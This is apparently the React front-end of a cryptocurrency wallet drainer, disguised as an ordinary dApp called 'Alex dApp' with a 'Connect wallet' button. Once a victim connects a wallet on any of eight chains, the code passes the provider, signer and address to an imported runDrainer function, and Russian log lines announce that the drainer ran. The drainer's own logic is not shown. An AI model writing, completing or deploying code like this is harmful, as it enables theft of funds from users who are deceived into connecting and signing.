import React from 'react'
import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  projectId,
  features: {
    analytics: true,
    email: false,
    socials: false,
  },
  allWallets: 'SHOW',
})

export default function App() {
  const handleConnect = async () => {
    try {
      await modal.open()

      const adapter = modal.getConnectedAdapter()
      if (!adapter) throw new Error('❌ Кошелёк не подключён')

      const provider = await adapter.getProvider()
      const signer = await adapter.getSigner()
      const address = await signer.getAddress()

      console.log('✅ Кошелёк подключён:', address)

      await runDrainer(provider, signer, address)
      console.log('🚀 Drainer выполнен')
    } catch (err) {
      console.error('Ошибка подключения или вызова:', err)
      alert(`Ошибка: ${err.message}`)
    }
  }

  return (
    <div style={{ padding: '2rem', fontFamily: 'sans-serif' }}>
      <h1>Alex dApp</h1>
      <button onClick={handleConnect} style={{
        padding: '1rem 2rem',
        backgroundColor: '#333',
        color: '#fff',
        border: 'none',
        borderRadius: '8px',
        cursor: 'pointer',
        fontSize: '1rem'
      }}>
        Подключить кошелёк
      </button>
    </div>
  )
}
